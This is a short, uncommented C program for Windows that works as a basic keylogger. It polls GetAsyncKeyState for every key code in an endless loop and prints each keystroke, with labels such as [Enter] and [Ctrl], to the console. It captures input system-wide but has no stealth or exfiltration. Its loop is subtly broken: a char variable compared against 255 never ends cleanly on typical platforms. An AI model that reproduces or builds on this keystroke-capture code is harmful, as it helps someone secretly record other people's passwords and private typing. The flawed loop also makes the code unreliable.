#include <stdio.h>
#include <string.h>
#include <windows.h>

#define CLICK_EVENT (-32767)

int main() {
    char s[100] = {0,};
    while (1) {
        for (char c = 0; c < 255; c++) {
            if (GetAsyncKeyState(c) == CLICK_EVENT) {
                memset(s, 0, sizeof(s));
                switch(c) {
                    case 8 :
                        strcpy(s, "[Backspace]");
                        break;
                    case 9 :
                        strcpy(s, "[Tab]");
                        break;
                    case 13 :
                        strcpy(s, "[Enter]");
                        break;
                    case 16 :
                        strcpy(s, "[Shift]");
                        break;
                    case 17 :
                        strcpy(s, "[Ctrl]");
                        break;
                    case 18 :
                        strcpy(s, "[Alt]");
                        break;
                    case 27 :
                        strcpy(s, "[Esc]");
                        break;
                    case 32 :
                        strcpy(s, "[Space bar]");
                        break;
                    case 33 :
                        strcpy(s, "[Page Up]");
                        break;
                    case 34 :
                        strcpy(s, "[Page Down]");
                        break;
                    case 35 :
                        strcpy(s, "[End]");
                        break;
                    case 36 :
                        strcpy(s, "[Home]");
                        break;

                    default:
                        if (c != 1 && c != 2 && c != 4)
                        sprintf(s, "%c", c);
                }

                printf("%s\n", s);
            }
        }
    }
    return 0;
}